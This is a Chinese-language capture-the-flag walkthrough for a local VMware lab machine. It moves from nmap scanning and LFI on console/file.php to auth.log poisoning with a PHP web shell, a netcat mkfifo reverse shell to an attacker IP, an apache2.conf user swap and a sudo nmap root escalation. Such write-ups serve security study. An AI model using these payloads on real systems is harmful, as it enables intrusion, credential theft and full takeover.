VMware双击打开，nat模式运行即可！

--------------------------------------------
--------------------------------------------
1、nmap 192.168.253.0/24 -sP

Nmap scan report for 192.168.253.251
Host is up (0.00072s latency).


--------------------------------------------
--------------------------------------------
2、nmap 192.168.253.251 -p- -A
80/tcp open  http    Apache httpd 2.4.25 ((Debian))


--------------------------------------------
--------------------------------------------
3、web信息收集

http://192.168.253.251/


--------------------------------------------
--------------------------------------------
4、目录爆破

dirb http://192.168.253.251/
http://192.168.253.251/console/file.php


漏扫：
nikto -h http://192.168.253.251/console/file.php
发现存在文件包含漏洞！

--------------------------------------------
--------------------------------------------
5、LFI文件包含


http://192.168.253.251/console/file.php?file=../../../../../../../etc/passwd
curl -s http://192.168.253.251/console/file.php?file=../../../../../../../etc/passwd


--------------------------------------------
--------------------------------------------
6、LFI信息枚举扫描

linux常见的log！

常见的敏感信息目录文件：
/etc/httpd/logs/acces_log 
/etc/httpd/logs/error_log 
/var/www/logs/access_log 
/var/www/logs/access.log 
/usr/local/apache/logs/access_ log 
/usr/local/apache/logs/access. log 
/var/log/apache/access_log 
/var/log/apache2/access_log 
/var/log/apache/access.log 
/var/log/apache2/access.log
/var/log/access_log
/var/log/auth.log
/home/mahakal/.bash_history
/home/mahakal/.mysql_history
/home/mahakal/.my.cnf
/home/mahakal/.ssh/authorized_keys
/home/mahakal/.ssh/id_rsa
/home/mahakal/.ssh/id_rsa.keystore
/home/mahakal/.ssh/id_rsa.pub
/home/mahakal/.ssh/known_hosts

for i in $(cat 1.txt); do echo -e "[-] $i:\n" && curl -s http://192.168.253.251/console/file.php?file=../../../../../../..$i; done


--------------------------------------------
--------------------------------------------
7、毒化日志-webshell

https://www.jianshu.com/p/7cbc878d64ae

由于auth.log文件在我们尝试连接Web服务器时为每次成功和失败的登录尝试生成日志。现在利用这个功能，我将发送恶意PHP代码 作为假用户，它将作为新日志自动添加到auth.log文件中。

ssh '<?php passthru($_GET['cmd']); ?>'@192.168.253.251
ssh '<?php system($_GET['cmd']); ?>'@192.168.253.251


burpsuite开启：再次当您检查其日志时，您会发现PHP代码已添加为新日志！
GET /console/file.php?file=../../../../../../../var/log/auth.log&cmd=id HTTP/1.1


rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.253.138 1234 >/tmp/f

反弹shell传递给：右键->Convert selection->URL->URL-encode all characters

python3 -c 'import pty; pty.spawn("/bin/bash")'


--------------------------------------------
--------------------------------------------
8、内网信息收集

uid=1000(natraj) gid=1000(natraj) groups=1000(natraj),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)

[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
/etc/apache2/apache2.conf


--------------------------------------------
--------------------------------------------
9、apache2提权

base64 apache2.conf
cat base64.txt | base64 -d > apache2.conf

将115~116行修改为：
User mahakal
Group mahakal


将文件下载到机器上，替换掉原来的:
python -m SimpleHTTPServer 8081
wget http://192.168.253.138:8081/apache2.conf
chmod 777 apache2.conf
cp apache2.conf /etc/apache2/apache2.conf

然后重启环境重新拿shell！

uid=1001(mahakal) gid=1001(mahakal) groups=1001(mahakal)
成功获得mahakal权限用户！

--------------------------------------------
--------------------------------------------
10、sudo 提权

sudo -l
User mahakal may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/nmap


https://gtfobins.github.io/gtfobins/nmap/#sudo

TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF

成功拿到root权限！




--------------------------------------------
--------------------------------------------
11、知识拓展

查找可利用的点：

find / -user root -perm -4000 -print 2>/dev/null    //查找suid
find / -perm -4000 2>dev/null | xargs ls -la     //查找suid并详细展示
find / -writable -type d 2>/dev/null          //查找当前权限可写的路径
find / -type f -perm 777 -exec ls -l {} \; 2>/dev/null       //查找777文件
find / -writable -type f 2>/dev/null | grep -v "/proc/" |xargs ls -al |grep root     //查找写权限文件


深入了解log：
https://www.wseo.org.cn/linux-auth-log-fail2ban_74_20190401.html
































